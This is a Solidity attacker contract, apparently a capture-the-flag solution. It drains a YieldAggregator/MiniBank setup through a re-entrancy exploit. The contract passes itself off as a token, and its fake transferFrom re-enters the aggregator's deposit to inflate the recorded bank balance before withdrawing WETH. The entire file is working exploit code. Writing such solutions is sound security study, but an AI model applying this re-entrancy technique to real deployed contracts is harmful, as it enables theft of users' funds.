pragma solidity 0.8.0;

import "./Setup.sol";
import "./YieldAggregator.sol";
import "hardhat/console.sol";

contract YieldAggregatorAttacker {
    Setup public setup;
    YieldAggregator public aggregator;
    MiniBank public bank;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(Setup _setup) {
        setup = _setup;
        aggregator = _setup.aggregator();
        bank = _setup.bank();
    }

    function attack() external payable {
        weth.deposit{value: msg.value}();
        // agg pulls in, calls bank.mint which pulls in from agg
        weth.approve(address(aggregator), type(uint256).max);

        address[] memory _tokens = new address[](2);
        _tokens[0] = address(weth);
        _tokens[1] = address(this); // for re-entrancy

        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 0 ether; // to make math easy deposit 0 on the first one
        _amounts[1] = 0 ether;

        aggregator.deposit(Protocol(address(bank)), _tokens, _amounts);

        uint256 myBalance = bank.balanceUnderlying();
        console.log(
            "my bank balance %s",
            myBalance
        );

        _tokens = new address[](1);
        _tokens[0] = address(weth);

        _amounts = new uint256[](1);
        _amounts[0] = myBalance;
        aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts);

        console.log(
            "weth.balanceOf(address(aggregator))",
            weth.balanceOf(address(aggregator))
        );
        console.log(
            "weth.balanceOf(address(bank))",
            weth.balanceOf(address(bank))
        );

        require(setup.isSolved(), "!solved");
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool) {
        // re-entrancy
        console.log("re-entrancy");
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;

        aggregator.deposit(Protocol(address(bank)), _tokens, _amounts);

        return true;
    }

    function approve(address, uint256) external view returns (bool) {
        console.log("approve called");
        return true; // doesn't matter, not checked
    }

    fallback() external payable {
        console.log("fallback called");
    }
}
